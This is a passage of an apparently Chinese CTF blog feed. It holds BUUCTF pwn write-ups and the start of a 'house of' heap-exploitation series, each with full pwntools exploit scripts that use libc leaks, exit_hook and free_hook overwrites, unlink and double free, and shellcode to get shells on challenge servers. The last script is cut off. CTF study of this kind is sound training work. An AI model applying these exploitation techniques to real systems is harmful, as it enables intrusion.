class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="十六、wustctf2020-closed"><a href="#十六、wustctf2020-closed" class="headerlink" title="十六、wustctf2020_closed"></a>十六、wustctf2020_closed</h2><p>这题比较有意思，记录一下，考的是linux的基础知识</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152712612.png" alt="image-20210902152712612"></p><p>进入IDA，程序十分简单，甚至主函数已经运行了system(“/bin/sh”)了，但是注意这边执行了close(1)以及close(2)。这代表什么？代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，但是我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭，才能看到输出</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152420434.png" alt="image-20210902152420434"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152447680.png" alt="image-20210902152447680"></p><h2 id="十七、ciscn-2019-n-7"><a href="#十七、ciscn-2019-n-7" class="headerlink" title="十七、ciscn_2019_n_7"></a>十七、ciscn_2019_n_7</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904105152457.png" alt="image-20210904105152457"></p><p>常规checksec一下，64位，保护全开</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111520818.png" alt="image-20210904111520818"></p><p>进入IDA，分析程序，首先程序不存在释放功能，并且堆块只能生成一次，这直接断绝了劫持hook指针的做法</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111633970.png" alt="image-20210904111633970"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111749218.png" alt="image-20210904111749218"></p><p>在add，edit函数中，我们可以直接修改程序中的堆块指针，也就是说，我们拥有了任意写的能力</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111836132.png" alt="image-20210904111836132"></p><p>其次在输入666后，程序会打印出puts的地址，也就是也拥有了libc地址，似乎一切都具备了？就差一个可以让我们直接写入one_gadget的地方。写在哪？这里介绍一个新的hook，exit_hook，在执行exit函数时，会执行到两个函数，分别是<code>_dl_rtld_lock_recursive</code>和<code>_dl_rtld_unlock_recursive</code>，其中一个劫持为one_gadget都行，并且这两个的偏移是固定的值</p><p>libc-2.23.so:</p><ul><li>rtld_lock = libc_base + 0x5F0F48</li><li>rtld_unlock = libc_base + 0x5F0F50</li></ul><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113624683.png" alt="image-20210904113624683"></p><p>刚好很巧，这边执行到exit时，也是把文件描述符1和2关闭了，看不见输出，所以跟上题一样的处理方式，<code>exec 1&gt;&amp;0</code>才能看到交互</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113504655.png" alt="image-20210904113504655"></p><p>成功getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_7&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28496</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input string Length:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;New Author name:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;contents:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0xf1147</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>add(<span class="hljs-number">0x60</span>,p64(rtld_lock) * <span class="hljs-number">2</span>)<br>edit(p64(rtld_lock) * <span class="hljs-number">2</span>,p64(ogg))<br>exit()<br>p.sendline(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="十九、ciscn-2019-es-4"><a href="#十九、ciscn-2019-es-4" class="headerlink" title="十九、ciscn_2019_es_4"></a>十九、ciscn_2019_es_4</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904121810292.png" alt="image-20210904121810292"></p><p>checksec一下，64位，PIE没开</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221627524.png" alt="image-20210904221627524"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221644339.png" alt="image-20210904221644339"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221657542.png" alt="image-20210904221657542"></p><p>首先漏洞点存在edit函数里面，offbynull，其次edit和show函数，都存在验证次数问题，并且验证的值保存在.bss上，没开PIE，也就是说，应该是unlink的题，把chunk改到.bss上，然后修改key值。然后版本是libc-2.27.so，存在tcache，所以在假chunk底下那个chunk要释放七个相同大小去填充tcache bin</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904230122725.png" alt="image-20210904230122725"></p><p>unlink成功，把chunk的指针设为.bss上的值</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231117920.png" alt="image-20210904231117920"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231321497.png" alt="image-20210904231321497"></p><p>通过unlink设置的指针，把前面两个修改为同一个堆地址，借此造成double free，然后把堆块分配到key上，修改key值，让show功能恢复使用，然后通过show功能泄露libc地址。然后再次使用unlink设置好的指针，把前面的堆块指针改为指向free_hook，然后通过edit函数，往里面写入system函数，之后free一个写有/bin/sh的堆块即可</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904234122710.png" alt="image-20210904234122710"></p><p>然后，远程打时，堆块地址是只有图中那么长的，要注意一下。然后就是我们最后往free_hook写入system的那个堆块，必须要在这之前是被申请出来的，具体原因我也不知道为什么，我做的时候一直卡在这最后一步，没想通，然后是对照别人wp才改了这个点，然后通了</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905095712141.png" alt="image-20210905095712141"></p><p>getshell！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_es_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29483</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;gift: &quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>ptr = <span class="hljs-number">0x602118</span><br>key = <span class="hljs-number">0x00000000006022B8</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>heap_addr = add(<span class="hljs-number">7</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>log,success(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;b&quot;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;c&quot;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>free(i)<br><span class="hljs-comment">#unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>)<br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">7</span>,fake_chunk)<br>free(<span class="hljs-number">8</span>)<br><br>payload = p64(heap_addr + <span class="hljs-number">0x190</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,p64(key))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x80</span>,p32(<span class="hljs-number">5</span>) + p32(<span class="hljs-number">5</span>))<br>show(<span class="hljs-number">6</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = p64(free_hook) * <span class="hljs-number">3</span> + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="二十、lctf2016-pwn200"><a href="#二十、lctf2016-pwn200" class="headerlink" title="二十、lctf2016_pwn200"></a>二十、lctf2016_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105020439.png" alt="image-20210905105020439"></p><p>常规checksec一下，64位，保护几乎都没开启</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105059956.png" alt="image-20210905105059956"></p><p>进入IDA，进入的第一个函数就存在问题，这边最长输入0x30的字符，但是v2距离rbp的距离也是0x30，所以可以借此打印出rbp的值，得到栈上地址，那么应该就是ret2shellcode了</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105342837.png" alt="image-20210905105342837"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105242460.png" alt="image-20210905105242460"></p><p>再往下看，这边存在任意地址写</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110435529.png" alt="image-20210905110435529"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110553881.png" alt="image-20210905110553881"></p><p>计算一下偏移</p><p>然后通过任意地址写往free@got表里写入前面算好的shellcode的地址，再执行到后面程序中的free函数，然后跳转到写好的shellcode执行</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905112409521.png" alt="image-20210905112409521"></p><p>getshell！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25517</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn200&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *main&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;who are u?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br>p.send(shellcode.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>))<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">80</span><br>log.info(<span class="hljs-built_in">hex</span>(leak_addr))<br>p.recvuntil(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;give me money~\n&quot;</span>)<br>payload = p64(leak_addr) + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(free_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、xdctf2015-pwn200&quot;&gt;&lt;a href=&quot;#一、xdctf2015-pwn200&quot; class=&quot;headerlink&quot; title=&quot;一、xdctf2015_pwn200&quot;&gt;&lt;/a&gt;一、xdctf2015_pwn200&lt;/h2&gt;&lt;p&gt;&lt;img s</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>house of系列</title>
    <link href="http://example.com/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/"/>
    <id>http://example.com/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</id>
    <published>2021-07-27T06:13:59.000Z</published>
    <updated>2021-10-13T08:01:21.579Z</updated>
    
    <content type="html"><![CDATA[<p> 该系列内容较多，将会在较长时间持续更新</p><h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>爆破概率太低，不建议再用，了解一下利用思路即可</p><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>利用条件</p><ul><li>修改后的Top chunk size &gt; MINSIZE （0x10）</li><li>Top chunk inuse == 1</li><li>修改后的Top chunk size 必须对齐到内存页</li><li>最后下一次分配的chunk大于Top chunk size - 0x10</li></ul><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>技术来源：<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p><p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p><p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png" alt="http://p7.qhimg.com/t01c4e1f8669a8b77bd.png"></p><p>（2）存在可将堆变量指针覆盖为指向可控区域，即上一步中的区域</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>（1）伪造堆块，在可控1及可控2（可控2的伪造size不能小于2*SIZE_SZ且不能大于已分配内存）构造好数据，将它伪造成一个fast chunk。</p><p>（2）覆盖堆指针指向上一步伪造的堆块。</p><p>（3）释放堆块，将伪造的堆块释放入fast bin里面。</p><p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p><p>第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在16<del>64字节之间，64位是在32</del>128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面</p><h3 id="例题BUU-lctf2016pwn200"><a href="#例题BUU-lctf2016pwn200" class="headerlink" title="例题BUU-lctf2016pwn200"></a>例题BUU-lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png" alt="image-20210905204052044"></p><p>常规checksec一下，保护基本没开。</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png" alt="image-20210905204120841"></p><p>这里的输入存在漏洞，填满可以泄露出rsp上的值，获得栈上地址</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png" alt="http://p8.qhimg.com/t01eb7870c8fa4fde39.png"></p><p>目标地址的构造为上图所示，在money中输入的是伪堆块的size，在id里输入的是下一个堆块的size，以此绕过free释放堆块时候系统的检查</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png" alt="image-20210905204549591"></p><p>然后就是：</p><p>（1）覆盖堆指针，在输入money的时候，会覆盖堆块。</p><p>（2）调用free函数将伪堆块释放到fastbin中</p><p>（3）申请堆块，将刚刚的伪堆块申请出来</p><p>（4）输入数据，即可修改目标区域，eip，使其指向shellcode</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png" alt="image-20210905230703667"></p><p>这是构造出来的fake_chunk，后面就是要把这块释放了，然后再申请回来，把0x400b34这个地址覆盖为shellcode，即可在退出程序时返回到shellcode去执行</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png" alt="image-20210905212358111"></p><p>getshell！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span 